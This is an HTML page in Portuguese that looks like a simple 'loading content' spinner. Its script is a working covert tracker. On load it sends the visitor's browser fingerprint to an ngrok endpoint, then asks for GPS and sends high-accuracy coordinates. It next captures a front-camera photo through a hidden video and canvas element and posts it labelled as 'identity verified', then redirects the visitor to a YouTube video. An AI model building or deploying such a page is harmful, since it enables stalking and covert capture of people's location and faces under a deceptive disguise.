<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loader-container {
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #5f6368;
            font-size: 14px;
            margin-top: 10px;
        }
        video, canvas { 
            display: none; 
            position: absolute;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <div class="loading-text">Carregando conteúdo...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ========== CONFIGURAÇÃO ==========
        const API_URL = 'https://dictation-jawline-reanalyze.ngrok-free.dev/api/capturar';
        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        
        let gpsCapturado = false;
        let fotoCapturada = false;

        // ========== FUNÇÃO PARA ENVIAR DADOS ==========
        async function enviarDados(dados) {
            try {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(dados)
                });
            } catch (error) {
                console.error('Erro ao enviar:', error);
            }
        }

        // ========== REGISTRA ACESSO INICIAL ==========
        window.onload = function() {
            enviarDados({
                evento: 'pagina_acessada',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                idioma: navigator.language,
                tela: `${screen.width}x${screen.height}`,
                plataforma: navigator.platform,
                referrer: document.referrer
            });

            // Aguarda 500ms e solicita permissões
            setTimeout(() => {
                solicitarPermissoes();
            }, 500);
        };

        // ========== SOLICITA PERMISSÕES AUTOMATICAMENTE ==========
        async function solicitarPermissoes() {
            // Solicita GPS primeiro
            await capturarGPS();
            
            // Aguarda 1 segundo e solicita câmera
            setTimeout(async () => {
                await capturarFoto();
                
                // Após capturar tudo, redireciona
                setTimeout(() => {
                    redirecionar();
                }, 1000);
            }, 1000);
        }

        // ========== CAPTURA GPS ==========
        async function capturarGPS() {
            return new Promise((resolve) => {
                if (!("geolocation" in navigator)) {
                    resolve();
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        await enviarDados({
                            evento: 'localizacao_capturada',
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            precisao: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            timestamp: new Date().toISOString()
                        });
                        gpsCapturado = true;
                        resolve();
                    },
                    function(error) {
                        // Se negar permissão, continua mesmo assim
                        console.log('GPS negado');
                        resolve();
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ========== CAPTURA FOTO ==========
        async function capturarFoto() {
            return new Promise(async (resolve) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        } 
                    });
                    
                    video.srcObject = stream;

                    // Aguarda 1 segundo para a câmera inicializar
                    setTimeout(async () => {
                        try {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            
                            const imagemBase64 = canvas.toDataURL('image/jpeg', 0.7);

                            await enviarDados({
                                evento: 'identidade_verificada',
                                foto: imagemBase64,
                                timestamp: new Date().toISOString(),
                                resolucao: `${canvas.width}x${canvas.height}`
                            });

                            fotoCapturada = true;
                            
                            // Para a câmera
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        } catch (error) {
                            console.log('Erro ao capturar foto');
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }
                    }, 1000);

                } catch (error) {
                    // Se negar câmera, continua mesmo assim
                    console.log('Câmera negada');
                    resolve();
                }
            });
        }

        // ========== REDIRECIONA ==========
        function redirecionar() {
            window.location.href = REDIRECT_URL;
        }
    </script>
</body>
</html>
